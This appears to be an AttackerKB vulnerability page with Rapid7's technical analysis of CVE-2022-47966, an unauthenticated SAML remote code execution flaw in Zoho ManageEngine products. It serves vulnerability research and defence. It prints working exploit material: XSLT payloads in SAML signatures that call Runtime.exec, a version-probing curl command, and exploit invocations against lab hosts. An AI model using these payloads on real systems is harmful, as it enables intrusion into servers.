* manageengine endpoint dlp plus,
* manageengine key manager plus,
* manageengine key manager plus 6.4,
* manageengine os deployer,
* manageengine pam360,
* manageengine pam360 5.7,
* manageengine password manager pro,
* manageengine password manager pro 12.1,
* manageengine patch manager plus,
* manageengine remote access plus,
* manageengine remote monitoring and management central,
* manageengine servicedesk plus,
* manageengine servicedesk plus 14.0,
* manageengine servicedesk plus msp,
* manageengine servicedesk plus msp 13.0,
* manageengine supportcenter plus 11.0,
* manageengine vulnerability manager plus

### Metasploit Modules

[exploit/windows/http/manageengine\_endpoint\_central\_saml\_rce\_cve\_2022\_47966 (https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/http/manageengine\_endpoint\_central\_saml\_rce\_cve\_2022\_47966.rb)](https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/http/manageengine_endpoint_central_saml_rce_cve_2022_47966.rb)
[exploit/multi/http/manageengine\_servicedesk\_plus\_saml\_rce\_cve\_2022\_47966 (https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/multi/http/manageengine\_servicedesk\_plus\_saml\_rce\_cve\_2022\_47966.rb)](https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/multi/http/manageengine_servicedesk_plus_saml_rce_cve_2022_47966.rb)
[exploit/multi/http/manageengine\_adselfservice\_plus\_saml\_rce\_cve\_2022\_47966 (https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/multi/http/manageengine\_adselfservice\_plus\_saml\_rce\_cve\_2022\_47966.rb)](https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/multi/http/manageengine_adselfservice_plus_saml_rce_cve_2022_47966.rb)

### Exploited in the Wild

Reported by:
![](https://avatars.githubusercontent.com/u/33330829?v=4&s=50)

[mkienow-r7](/contributors/mkienow-r7)
 indicated source as
 Government or Industry Alert  [(https://www.cisa.gov/known-exploited-vulnerabilities-catalog)](https://www.cisa.gov/known-exploited-vulnerabilities-catalog)

[Reported: January 23, 2023 4:07pm UTC (1 year ago)](#exploited-in-the-wild_1d16f9b2-7bcc-4e1d-bd7c-93cff5364bc5)

#### Would you like to delete this Exploited in the Wild Report?

[Yes, delete this report](#exploied-in-the-wild_1d16f9b2-7bcc-4e1d-bd7c-93cff5364bc5)

![](https://avatars.githubusercontent.com/u/40408740?v=4&s=50)

[ccondon-r7](/contributors/ccondon-r7)
 indicated source as
 News Article or Blog  [(https://www.rapid7.com/blog/post/2023/01/19/etr-cve-2022-47966-rapid7-observed-exploitation-of-critical-manageengine-vulnerability/?referrer=etrblog/&utm\_source=rapid7site&utm\_medium=referral&utm\_campaign=etr\_cve-2022-47966)](https://www.rapid7.com/blog/post/2023/01/19/etr-cve-2022-47966-rapid7-observed-exploitation-of-critical-manageengine-vulnerability/?referrer=etrblog/&utm_source=rapid7site&utm_medium=referral&utm_campaign=etr_cve-2022-47966)

[Reported: January 23, 2023 4:14pm UTC (1 year ago)](#exploited-in-the-wild_9c3c0bdd-7a98-48de-a889-f351a2aec7cf)

#### Would you like to delete this Exploited in the Wild Report?

[Yes, delete this report](#exploied-in-the-wild_9c3c0bdd-7a98-48de-a889-f351a2aec7cf)

![](https://avatars.githubusercontent.com/u/63261883?v=4&s=50)

[gwillcox-r7](/contributors/gwillcox-r7)
 indicated sources as

* Threat Feed [(https://www.microsoft.com/en-us/security/blog/2023/04/18/nation-state-threat-actor-mint-sandstorm-refines-tradecraft-to-attack-high-value-targets/)](https://www.microsoft.com/en-us/security/blog/2023/04/18/nation-state-threat-actor-mint-sandstorm-refines-tradecraft-to-attack-high-value-targets/)
* News Article or Blog [(https://businessinsights.bitdefender.com/tech-advisory-manageengine-cve-2022-47966)](https://businessinsights.bitdefender.com/tech-advisory-manageengine-cve-2022-47966)

[Reported: February 27, 2023 4:35pm UTC (1 year ago)](#exploited-in-the-wild_b50031c2-b390-4cf9-bf6f-7a5fb8cf8677) •
Edited 1 year ago

#### Would you like to delete this Exploited in the Wild Report?

[Yes, delete this report](#exploied-in-the-wild_b50031c2-b390-4cf9-bf6f-7a5fb8cf8677)

![](https://avatars.githubusercontent.com/u/117099647?v=4&s=50)

[cbeek-r7](/contributors/cbeek-r7)
 indicated source as
 Government or Industry Alert  [(https://blog.talosintelligence.com/lazarus-quiterat/)](https://blog.talosintelligence.com/lazarus-quiterat/)

[Reported: August 25, 2023 7:30am UTC (1 year ago)](#exploited-in-the-wild_e28f53e6-cf6f-4b91-89be-6cb19dfd4315)

#### Would you like to delete this Exploited in the Wild Report?

[Yes, delete this report](#exploied-in-the-wild_e28f53e6-cf6f-4b91-89be-6cb19dfd4315)

![](/static/public/img/akb-worker-avatar.png)

AttackerKB Worker indicated source as
 Government or Industry Alert  [(https://www.cisa.gov/news-events/alerts/2023/01/23/cisa-adds-one-known-exploited-vulnerability-catalog)](https://www.cisa.gov/news-events/alerts/2023/01/23/cisa-adds-one-known-exploited-vulnerability-catalog)

[Reported: November 08, 2024 8:24am UTC (2 months ago)](#exploited-in-the-wild_31e66e4c-4930-4bfd-9bb2-e48a795fa885)

#### Would you like to delete this Exploited in the Wild Report?

[Yes, delete this report](#exploied-in-the-wild_31e66e4c-4930-4bfd-9bb2-e48a795fa885)

### References

##### Canonical

[CVE-2022-47966 (https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-47966)](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-47966)
##### Advisory

[CISA Security Bulletin (https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-207a)](https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-207a)
##### Exploit

PoCs that have not been added by contributors directly have been sourced from:
[nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub).

A PoC added here by the AKB Worker must have at least 2 GitHub stars.

[CVE-2022-47966-Scan (https://github.com/vonahisec/CVE-2022-47966-Scan)](https://github.com/vonahisec/CVE-2022-47966-Scan) (Added by AKB Worker)[CVE-2022-47966 (https://github.com/Inplex-sys/CVE-2022-47966)](https://github.com/Inplex-sys/CVE-2022-47966) (Added by AKB Worker)
##### Miscellaneous

<https://manageengine.com><https://github.com/apache/santuario-xml-security-java/tags?after=1.4.6><https://www.manageengine.com/security/advisory/CVE/cve-2022-47966.html><http://packetstormsecurity.com/files/170882/Zoho-ManageEngine-ServiceDesk-Plus-14003-Remote-Code-Execution.html><http://packetstormsecurity.com/files/170925/ManageEngine-ADSelfService-Plus-Unauthenticated-SAML-Remote-Code-Execution.html><http://packetstormsecurity.com/files/170943/Zoho-ManageEngine-Endpoint-Central-MSP-10.1.2228.10-Remote-Code-Execution.html><https://blog.viettelcybersecurity.com/saml-show-stopper/><https://github.com/horizon3ai/CVE-2022-47966><https://www.horizon3.ai/manageengine-cve-2022-47966-technical-deep-dive/><https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-250a><https://attackerkb.com/topics/gvs0Gv8BID/cve-2022-47966/rapid7-analysis>

### Additional Info

Authenticated

Unknown
Exploitable

Unknown
Reliability

Unknown
Stability

Unknown
Available Mitigations

Unknown
Shelf Life

Unknown
Userbase/Installbase

Unknown
Patch Effectiveness

Unknown

![](/static/public/img/rapid7-avatar.svg)

Rapid7
[January 20, 2023 11:11pm UTC (1 year ago)](/topics/gvs0Gv8BID/cve-2022-47966/rapid7-analysis)

###### Technical Analysis

## Description

CVE-2022-47966 is an unauthenticated remote code execution vulnerability that affects two dozen Zoho ManageEngine products, including ADSelfService Plus, ServiceDesk Plus, and Password Manager Pro, all of which have been exploited in the wild over the past year. The vulnerability arises from an outdated dependency on Apache Santuario, which is itself vulnerable to remote code execution going back to 2008. Successful exploitation of vulnerable ManageEngine products requires the target system to have SAML-based SSO. Some implementations are only vulnerable if SAML-based SSO is currently active, and others merely require it to have been enabled at some point in the past. See [Zoho’s advisory](https://www.manageengine.com/security/advisory/CVE/cve-2022-47966.html) for complete details on vulnerable products.

Rapid7’s incident response team has [confirmed multiple instances of exploitation in the wild](https://www.rapid7.com/blog/post/2023/01/19/etr-cve-2022-47966-rapid7-observed-exploitation-of-critical-manageengine-vulnerability/) in customer environments as of Thursday, January 19, 2023. Rapid7 observed exploitation as early as Tuesday, January 17, 2023. Security firm Horizon3 published [technical details](https://www.horizon3.ai/manageengine-cve-2022-47966-technical-deep-dive/), including a proof of concept (PoC), on Thursday, January 19.

**Important note:** This analysis will demonstrate that while the product the public PoC targets (ServiceDesk Plus) seems to be exploitable without any special modifications, the other product we tested (ADSelfService Plus) requires an attacker to obtain and modify the PoC with two additional pieces of data (a unique GUID value and an `Issuer URL`) for successful exploitation. **In other words, for at least one product (and possibly others), the exploit needs to be customized not only to the product, but to the individual target.**

## Affected products

Zoho released patches for affected products in October and November of 2022; the exact timing of fixed version releases varies by product. Releasing patches 2-3 months before releasing the advisory is unusual, and potentially gave adversaries a wide window while nobody was aware of the critical nature of these patches. See ManageEngine’s [advisory](https://www.manageengine.com/security/advisory/CVE/cve-2022-47966.html) for specific product and version information.

The full list of affected ManageEngine products are:

* Access Manager Plus version 4307 and below\*
* Active Directory 360 version 4309 and below\*\*
* ADAudit Plus version 7080 and below\*\*
* ADManager Plus version 7161 and below\*\*
* ADSelfService Plus version 6210 and below\*\*
* Analytics Plus version 5140 and below\*
* Application Control Plus version 10.1.2220.17 and below\*
* Asset Explorer version 6982 and below\*\*
* Browser Security Plus version 11.1.2238.5 and below\*
* Device Control Plus version 10.1.2220.17 and below\*
* Endpoint Central version 10.1.2228.10 and below\*
* Endpoint Central MSP version 10.1.2228.10 and below\*
* Endpoint DLP version 10.1.2137.5 and below\*
* Key Manager Plus version 6400 and below\*
* OS Deployer version 1.1.2243.0 and below\*
* PAM 360 version 5712 and below\*
* Password Manager Pro version 12123 and below\*
* Patch Manager Plus version 10.1.2220.17 and below\*
* Remote Access Plus version 10.1.2228.10 and below\*
* Remote Monitoring and Management (RMM) version 10.1.40 and below\*
* ServiceDesk Plus version 14003 and below\*\*
* ServiceDesk Plus MSP version 13000 and below\*\*
* SupportCenter Plus version 11017 to 11025\*\*
* Vulnerability Manager Plus version 10.1.2220.17 and below\*

\* Vulnerable if configured SAML-based SSO and it is currently active.

\*\* Vulnerable if configured SAML-based SSO at least once in the past, regardless of the current SAML-based SSO status.

## Background

On October 25, 2022, [Khoa Dinh](https://twitter.com/_l0gg) from Viettel Cyber Security [reported](https://blog.viettelcybersecurity.com/saml-show-stopper/) a number of security vulnerabilities in Zoho’s ManageEngine products related to the usage of outdated libraries (specifically, [Apache Santuario](https://santuario.apache.org/javaindex.html) or `xmlsec`). Zoho began rolling out patches to their products to include the updated libraries a few days later, but didn’t post a public advisory until a few months later in January, 2023.

Dinh’s work, in turn, was based on earlier work from An Trinh of [tint0](https://blog.tint0.com/), who wrote about [some issues in Santuario](https://blog.tint0.com/2021/09/pinging-xmlsec.html) in September of 2021. Trinh wrote about Santuario vulnerabilities in the context of an XML external entity injection (XXE) vulnerability in PingFederate ([CVE-2021-41770](https://nvd.nist.gov/vuln/detail/CVE-2021-41770)).

Several different known vulnerabilities in Santuario are at play here:

* **[CVE-2021-40690](https://santuario.apache.org/secadv.data/CVE-2021-40690.txt.asc):** A vulnerability in the way Santuario parses XML that can bypass the `secureValidation` setting (Santuario versions before 2.2.3 and 2.1.7)
* **[CVE-2014-0107](https://issues.apache.org/jira/browse/XALANJ-2435):** A vulnerability in the Xalan XSLT parser that permits an attacker to instantiate an arbitrary class (Xalan versions prior to 2.7.2, [which are still quite common](https://mvnrepository.com/artifact/xalan/xalan))
* **[Bugzilla 44629](https://bz.apache.org/bugzilla/show_bug.cgi?id=44629):** A vulnerability from 2008 where transformations were performed before signature validation (Santuario versions prior to 1.4.2)

Different versions of ManageEngine products use different versions of Santuario and/or Xalan, but the two that we tested (ADSelfService Plus 6122 and ServiceDesk Plus 14003) both used Santuario 1.4.1, so we will focus on that for the remainder of our analysis. The [research from Dinh](https://blog.viettelcybersecurity.com/saml-show-stopper/) is much deeper than this one version of Santuario and is a great read!

## Technical analysis

### Santuario 1.4.1

[Apache Santuario](https://santuario.apache.org/download.html) (also known as `xmlsec`) version 1.4.1, performs [XSLT](https://en.wikipedia.org/wiki/XSLT) transformations prior to validating a message’s signature, which can lead the execution of arbitrary Java code. This was [fixed in 2008](https://bz.apache.org/bugzilla/show_bug.cgi?id=44629), but Zoho’s software was still using a vulnerable dependency.

In the code below, we can see how the signature verification [2] is performed after the signature (`SignedInfo`) is verified [1]. That means that a malicious `XMLSignature` can have a `SignedInfo` field that contains XSLT transformations that execute arbitrary Java code when applied. Because the Signature verification occurs *after* this has happened, failing the signature check doesn’t prevent the transformations from happening.

```
// xmlsec-1.4.1.jar!\org\apache\xml\security\signature\XMLSignature.class
  public boolean checkSignatureValue(Key paramKey) throws XMLSignatureException {
    if (paramKey == null) {
      Object[] arrayOfObject = { "Didn't get a key" };
      throw new XMLSignatureException("empty", arrayOfObject);
    }
    try {
      SignedInfo signedInfo = getSignedInfo();
      if (!signedInfo.verify(this._followManifestsDuringValidation)) // <-----  [1]
        return false;
      SignatureAlgorithm signatureAlgorithm = signedInfo.getSignatureAlgorithm();
      if (log.isDebugEnabled()) {
        log.debug("SignatureMethodURI = " + signatureAlgorithm.getAlgorithmURI());
        log.debug("jceSigAlgorithm    = " + signatureAlgorithm.getJCEAlgorithmString());
        log.debug("jceSigProvider     = " + signatureAlgorithm.getJCEProviderName());
        log.debug("PublicKey = " + paramKey);
      }
      signatureAlgorithm.initVerify(paramKey);
      SignerOutputStream signerOutputStream = new SignerOutputStream(signatureAlgorithm);
      UnsyncBufferedOutputStream unsyncBufferedOutputStream = new UnsyncBufferedOutputStream((OutputStream)signerOutputStream);
      signedInfo.signInOctectStream((OutputStream)unsyncBufferedOutputStream);
      try {
        unsyncBufferedOutputStream.close();
      } catch (IOException iOException) {}
      byte[] arrayOfByte = getSignatureValue();
      return signatureAlgorithm.verify(arrayOfByte); // <-----  [2]
    } catch (XMLSecurityException xMLSecurityException) {
      throw new XMLSignatureException("empty", xMLSecurityException);
    }
  }

```

As seen in the [public PoC](https://github.com/horizon3ai/CVE-2022-47966), a malicious signature can be constructed that, via XSLT transformations, will construct an arbitrary `java.lang.Runtime` object instance and call the `exec` method to execute an attacker-supplied command. An attacker is not limited to executing arbitrary commands, and may construct a more complex Java-based payload ([including a fully in-memory reverse shell](https://twitter.com/Junior_Baines/status/1616166860843622402)).

```
    <ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#">
      <ds:SignedInfo>
        <ds:CanonicalizationMethod Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"/>
        <ds:SignatureMethod Algorithm="http://www.w3.org/2001/04/xmldsig-more#rsa-sha256"/>
        <ds:Reference URI="#_b5a2e9aa-8955-4ac6-94f5-334047882600">
          <ds:Transforms>
            <ds:Transform Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"/>
            <ds:Transform Algorithm="http://www.w3.org/TR/1999/REC-xslt-19991116">
              <xsl:stylesheet version="1.0"
                xmlns:ob="http://xml.apache.org/xalan/java/java.lang.Object"
                xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
                <xsl:template match="/">
                  <xsl:variable name="rtobject" select="rt:getRuntime()"/>
                  <xsl:variable name="process" select="rt:exec($rtobject,'calc.exe')"/>
                  <xsl:variable name="processString" select="ob:toString($process)"/>
                  <xsl:value-of select="$processString"/>
                </xsl:template>
              </xsl:stylesheet>
            </ds:Transform>
          </ds:Transforms>
          <ds:DigestMethod Algorithm="http://www.w3.org/2001/04/xmlenc#sha256"/>
          <ds:DigestValue>H7gKuO6t9MbCJZujA9S7WlLFgdqMuNe0145KRwKl000=</ds:DigestValue>
        </ds:Reference>
      </ds:SignedInfo>
      <ds:SignatureValue>RbBWB6AIP8AN1wTZN6YYCKdnClFoh8GqmU2RXoyjmkr6I0AP371IS7jxSMS2zxFCdZ80kInvgVuaEt3yQmcq33/d6yGeOxZU7kF1f1D/da+oKmEoj4s6PQcvaRFNp+RfOxMECBWVTAxzQiH/OUmoL7kyZUhUwP9G8Yk0tksoV9pSEXUozSq+I5KEN4ehXVjqnIj04mF6Zx6cjPm4hciNMw1UAfANhfq7VC5zj6VaQfz7LrY4GlHoALMMqebNYkEkf2N1kDKiAEKVePSo1vHO0AF++alQRJO47c8kgzld1xy5ECvDc7uYwuDJo3KYk5hQ8NSwvana7KdlJeD62GzPlw==</ds:SignatureValue>
      <ds:KeyInfo/>
    </ds:Signature>

```
### Exploiting ADSelfService Plus

Exploiting CVE-2022-47966 against a vulnerable instance of ManageEngine ADSelfService Plus can be achieved with a small modification to the [publicly available PoC](https://github.com/horizon3ai/CVE-2022-47966). This modification includes the addition of a HTTP request parameter `RelayState`. There are two additional requirements an attacker must satisfy before being able to exploit the target:

* The attacker must know in advance a unique GUID value that has been created for the target server’s SAML Service Provider
* The attacker must know in advance a custom `Issuer URL` used by the Identity Provider which has been configured as the SAML authentication provider for the target server

It’s not immediately clear whether an attacker can discover these two values easily; we used the admin interface to obtain them.

The remainder of this walkthrough targets ADSelfService Plus build 6122 running on Windows Server 2022. ADSelfService Plus ships version 1.4.1 of [Apache Santuario]([https://santuario.apache.org/download.html]](https://santuario.apache.org/download.html%5D) in the library file `xmlsec-1.4.1.jar`, which, as discussed above, is vulnerable to a remote code execution issue from 2008.

#### Is the target vulnerable?

We can query a target’s version number through an unauthenticated REST API via the command:

```
curl -i -v -k https://172.30.132.194:9251/servlet/GetProductVersion -X POST

```

The response will be a JSON object that provides the target’s product name and build number, as shown below:

```
{"DB_TYPE":"postgres","BUILD_NUMBER":"6122","BUILD_ARCHITECTURE":"64","RUNNING_AS_SERVICE":false,"HA_SUPPORTED":"true","PRODUCT_SEQ_NO":"ADSSP-4-4A5RH563-1223578957895","PRODUCT_NAME":"ManageEngine ADSelfService Plus","IS_BUNDLED_DB":"true","INSTALLED_AS_SERVICE":false,"PRODUCT_VERSION":"6.1","SERVICE_ACCOUNT_PRIVILEGED":true}

```

As per the [ManageEngine advisory](https://www.manageengine.com/security/advisory/CVE/cve-2022-47966.html), any version prior to 6210 is vulnerable.

#### Running the exploit

We can run the exploit against a target in our lab as follows:

```
python CVE-2022-47966.py --command calc.exe --url https://172.30.132.194:9251/samlLogin/3899e6a9ab0f2b437448258c4c14eafdd8760add --issuer https://ad.test-domain/saml/3899e6a9ab0f2b437448258c4c14eafdd8760add --relaystate https://172.30.132.194:9251/samlLogin/LoginAuth

```

As shown above the attacker must supply the unique GUID as part of the requested URL to the `/samlLogin` endpoint, as well as supplying a custom `Issuer URL`.

#### Stepping through the code

If we attach a debugger to the ADSelfService Plus service, we can step through exploitation to better understand what happens.

The HTTP POST request to the `/samlLogin/` endpoint will call `doPost` in the `SAMLIDPAuthServlet` class:

```
// ManageEngineADSFramework.jar!\com\manageengine\ads\fw\iamapps\handler\sso\idpauth\SAMLIDPAuthServlet.class
	protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
        String authFlow = null;
        String urlConfigId = null;
        String relayState = null;
        String uri = null;
        String contextPath = null;
        String reqMethod = null;
        String samlResponse = null;
        String errorPageUrl = null;
        String userName = null;
        String samlParamName = null;
        Boolean isValidUrl = false;
        JSONObject samlConfigParams;
        SAMLInterface samlAuthClass;
        try {
            errorPageUrl = SAMLIDPAuthHandler.getAuthParamValue("AUTH_ERROR_URL");
            uri = request.getRequestURI();
            contextPath = request.getContextPath().toString();
            samlParamName = uri.contains(SAMLIDPAuthHandler.getAuthParamValue("AUTH_LOGIN_URL")) ? "AUTH_LOGIN_URL" : "AUTH_LOGOUT_URL";
            urlConfigId = uri.replaceAll(contextPath + SAMLIDPAuthHandler.getAuthParamValue(samlParamName) + "/", "");
            request.setAttribute("URL_CONFIG_ID", urlConfigId);
            if (!SAMLIDPAuthHandler.isValidUrlConfigId(urlConfigId)) {
                this.context.getRequestDispatcher(errorPageUrl).forward(request, response);
            } else {
                relayState = request.getParameter("RelayState") != null ? request.getParameter("RelayState") : "";
                if (!"".equals(relayState)) {
                    relayState = SSOSAMLHandler.decode(relayState);
                }
                String authRuleName;
                if (uri.contains("samlLogin")) {
                    authFlow = SAMLIDPAuthHandler.getAuthFlow(request, urlConfigId); // <----- [1]
                    reqMethod = request.getMethod();
                    samlResponse = request.getParameter("SAMLResponse");
                    logger.log(Level.INFO, "uri :: " + uri + "\tMethod :: " + reqMethod + "\t Authentication Flow :: " + authFlow + "\t URL ID :: " + urlConfigId);
                    if ("POST".equalsIgnoreCase(reqMethod) && samlResponse != null && !"".equals(samlResponse) && authFlow != null && !"".equals(authFlow) && urlConfigId != null && !"".equals(urlConfigId)) { // <----- [2]
                        request.setAttribute("AUTH_FLOW", authFlow);
                        request.getSession().setAttribute("SAML_RELAY_STATE", relayState);
                        JSONObject userDetails = SAMLIDPAuthHandler.validateSAMLResponse(request); // <----- [3]

```

We can see from [1] above that the `authFlow` value is retrieved based on the request. This value is checked to be non-null in [2] before we can continue. The `authFlow` is determined by the provided `RelayState` parameter from the HTTP request and is configured to be mandatory (ie, the request must supply this parameter in order to continue). We then continue on to perform `validateSAMLResponse` [3].

```
// ManageEngineADSFramework.jar!\com\manageengine\ads\fw\iamapps\handler\sso\idpauth\SAMLIDPAuthHandler.class
    public static JSONObject validateSAMLResponse(HttpServletRequest request) throws Exception {
        Response samlResponse = null;
        Assertion assertion = null;
        Subject samlSubject = null;
        Status status = null;
        StatusCode statusCode = null;
        JSONObject userDetails = null;
        String samlNameID = null;
        String samlNameIDFormat = null;
        try {
            DefaultBootstrap.bootstrap();
            samlResponse = (Response)getXMLObject(request.getParameter("SAMLResponse")); // <----- [1]
            String issuerUrl;
            try {
                (new ResponseSchemaValidator()).validate(samlResponse);
                status = samlResponse.getStatus();
                (new StatusSchemaValidator()).validate(status);
                statusCode = status.getStatusCode();
                issuerUrl = statusCode.getValue();
                if (!"urn:oasis:names:tc:SAML:2.0:status:Success".equals(issuerUrl)) {
                    throw new Exception("ads.login.common.error.saml_response_status_not_success");
                }
                if (samlResponse.getAssertions().size() > 0) {
                    assertion = (Assertion)samlResponse.getAssertions().get(0); // <----- [2]
                }
                (new AssertionSchemaValidator()).validate(assertion);
            } catch (ValidationException var46) {
                LOGGER.log(Level.INFO, "EXCEPTION :: " + var46.getMessage());
                throw new Exception("ads.login.common.error.invalid_saml_response_or_assertion");
            }
            issuerUrl = assertion.getIssuer().getValue(); // <----- [3]
            String var10000 = (String)request.getSession().getAttribute(issuerUrl);
            String inResponseTo = samlResponse.getInResponseTo();
            String urlConfigId = (String)request.getAttribute("URL_CONFIG_ID");
            String authFlow = (String)request.getAttribute("AUTH_FLOW");
            String relayState = request.getParameter("RelayState") != null ? request.getParameter("RelayState") : "";
            if (!"".equals(relayState)) {
                relayState = SSOSAMLHandler.decode(relayState);
            }
            if (!isValidIssuerUrl(issuerUrl, urlConfigId)) { // <----- [4]
                throw new Exception("ads.login.common.error.invalid_issuer_url_found");
            }
            if (authFlow.equals("FACTOR_AUTHENTICATION")) {
                if (inResponseTo == null) {
                    throw new Exception("ads.login.common.error.idp_initiated_saml");
                }
                if (!isInResponseToValid(inResponseTo)) {
                    throw new Exception("ads.login.common.error.invalid_saml_invalid_inresponseto");
                }
            }

            String samlFlow = "IDP_INITIATED_SAML_SSO";
            if (authFlow.equals("SAML_LOGIN") && inResponseTo != null) {
                samlFlow = "SP_INITIATED_SAML_SSO";
            }
            request.getSession().setAttribute("SAML_FLOW", samlFlow);
            request.setAttribute("REQUEST_ID", inResponseTo);
            JSONObject samlConfigDetails = getSAMLConfigDetails(urlConfigId);
            String authMode = "SAML_LOGIN".equals(authFlow) ? "LOGIN_AUTH" : relayState.substring(relayState.lastIndexOf("/") + 1, relayState.length());
            long reqAuthBit = getAuthModeBitVsName(authMode);
            long assignedAuthBit = samlConfigDetails.getLong("AUTH_MODE_BIT");
            boolean isSAMLResponseSigned = false;
            boolean isSAMLAssertionSigned = false;
            if ((reqAuthBit & assignedAuthBit) != reqAuthBit) {
                throw new Exception("ads.login.common.error.invalid_saml_config_id_found");
            }

            if (samlConfigDetails.length() > 0) {
                try {
                    if (samlResponse.isSigned()) {
                        validateSignature(samlResponse, samlConfigDetails);
                        isSAMLResponseSigned = true;
                    }
                    if (assertion.isSigned()) {
                        validateSignature(assertion, samlConfigDetails); // <------ [5]
                        isSAMLAssertionSigned = true;
                    }

```

We can see above [1] that the base64-encoded `SAMLResponse` parameter is retrieved from the HTTP request and the `Assertions` element from the `SAMLResponse` is retrieved [2]. The `Issuer UR`L value is retrieved from the Assertion element [3] before being verified as the expected Issuer for the SAML response [4], as identified by the unique GUID supplied to the `/samlLogin/` endpoint. **If the Issuer is not the expected value, an exception will be raised and the request will not be processed further.** The signed Assertion element from the request can now be validated [5].

```
// ManageEngineADSFramework.jar!\com\manageengine\ads\fw\iamapps\handler\sso\idpauth\SAMLIDPAuthHandler.class
    public static void validateSignature(SignableXMLObject samlObject, JSONObject samlConfigDetails) throws SecurityException {
        KeySpec publicKeySpec = null;
        BasicX509Credential credential = new BasicX509Credential();
        try {
            String pubKey = samlConfigDetails.optString("PUBLIC_KEY", (String)null);
            if (!pubKey.contains("-----BEGIN CERTIFICATE-----")) {
                pubKey = "-----BEGIN CERTIFICATE-----\n" + pubKey + "-----END CERTIFICATE-----";
            } else {
                pubKey = pubKey.replaceAll("-----BEGIN CERTIFICATE-----", "-----BEGIN CERTIFICATE-----\n");
            }
            byte[] certByte = pubKey.getBytes();
            CertificateFactory certificateFactory = CertificateFactory.getInstance("X.509");
            InputStream certInputStream = new ByteArrayInputStream(certByte);
            Certificate certificate = certificateFactory.generateCertificate(certInputStream);
            publicKeySpec = new X509EncodedKeySpec(certificate.getPublicKey().getEncoded());
            KeyFactory keyFactory = KeyFactory.getInstance("RSA");
            PublicKey publicKey = keyFactory.generatePublic(publicKeySpec);
            credential.setPublicKey(publicKey);
            SignatureValidator signatureValidator = new SignatureValidator(credential);
            signatureValidator.validate(samlObject.getSignature());	// <------ [1]

			// ...snip...

// xmltooling-1.3.1.jar!\org\opensaml\xml\signature\SignatureValidator.class
    public void validate(Signature signature) throws ValidationException {
        this.log.debug("Attempting to validate signature using key from supplied credential");
        XMLSignature xmlSig = this.buildSignature(signature);
        Key validationKey = SecurityHelper.extractVerificationKey(this.validationCredential);
        if (validationKey == null) {
            this.log.debug("Supplied credential contained no key suitable for signature validation");
            throw new ValidationException("No key available to validate signature");
        } else {
            this.log.debug("Validating signature with signature algorithm URI: {}", signature.getSignatureAlgorithm());
            this.log.debug("Validation credential key algorithm '{}', key instance class '{}'", validationKey.getAlgorithm(), validationKey.getClass().getName());
            try {
                if (xmlSig.checkSignatureValue(validationKey)) { // <----- [2]

```

Validation of the `Signature` element (from the HTTP requests `SAMLResponse` parameter) occurs in the OpenSAML SignatureValidator class [1] which will proceed to call `checkSignatureValue` from the vulnerable `xmlsec-1.4.1.jar` library [2]. This signature check will ultimately fail; however, arbitrary code execution will have been achieved when the signature is processed by the vulnerable xmlsec library.

### Exploiting ServiceDesk Plus

Unlike ADSelfService Plus, **ServiceDesk Plus is exploitable using the public proof of concept with no special steps**, provided SAML authentication is (or has ever been) enabled. (To enable SAML, the setting is under Admin / Users & Permissions / SAML Single Sign On; we recommend using [Mock SAML](https://mocksaml.com/) as a back end).

To demonstrate the exploit, we stripped down the XML payload to the minimum that executes a process (we moved the important XSLT to the left margin to stand out better):

```
<?xml version="1.0" encoding="UTF-8"?>
<samlp:Response ID="_eddc1e5f-8c87-4e55-8309-c6d69d6c2adf" InResponseTo="_4b05e414c4f37e41789b6ef1bdaaa9ff" IssueInstant="2023-01-16T13:56:46.514Z" Version="2.0" xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol">
  <samlp:Status><samlp:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/></samlp:Status>
  <Assertion ID="_b5a2e9aa-8955-4ac6-94f5-334047882600" IssueInstant="2023-01-16T13:56:46.498Z" Version="2.0" xmlns="urn:oasis:names:tc:SAML:2.0:assertion">
    <Issuer>{issuer}</Issuer>
    <ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#">
      <ds:SignedInfo>
        <ds:CanonicalizationMethod Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"/>
        <ds:SignatureMethod Algorithm="http://www.w3.org/2001/04/xmldsig-more#rsa-sha256"/>
        <ds:Reference URI="#_b5a2e9aa-8955-4ac6-94f5-334047882600">
          <ds:Transforms>
            <ds:Transform Algorithm="http://www.w3.org/TR/1999/REC-xslt-19991116">
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime" xmlns:ob="http://xml.apache.org/xalan/java/java.lang.Object">
  <xsl:template match="/">
      <xsl:variable name="rtobject" select="rt:getRuntime()"/>
      <xsl:variable name="process" select="rt:exec($rtobject,'notepad.exe')"/>
      <xsl:variable name="processString" select="ob:toString($process)"/>
      <xsl:value-of select="$processString"/>
  </xsl:template>
</xsl:stylesheet>
          </ds:Transform>
          </ds:Transforms>
          <ds:DigestMethod Algorithm="http://www.w3.org/2001/04/xmlenc#sha256"/>
          <ds:DigestValue></ds:DigestValue>
        </ds:Reference>
      </ds:SignedInfo>
      <ds:KeyInfo/>
    </ds:Signature>
  </Assertion>
</samlp:Response>

```

We can send this using `curl`:

```
[ron@fedora ~]$ curl -i 'http://10.0.0.216:8080/SamlResponseServlet' --data-urlencode "SAMLResponse="$(base64 -w0 < ~/shared/tmp/demo.xml)
[...]
HTTP/1.1 500
Location: /
vary: accept-encoding
Content-Type: text/html;charset=UTF-8
Transfer-Encoding: chunked
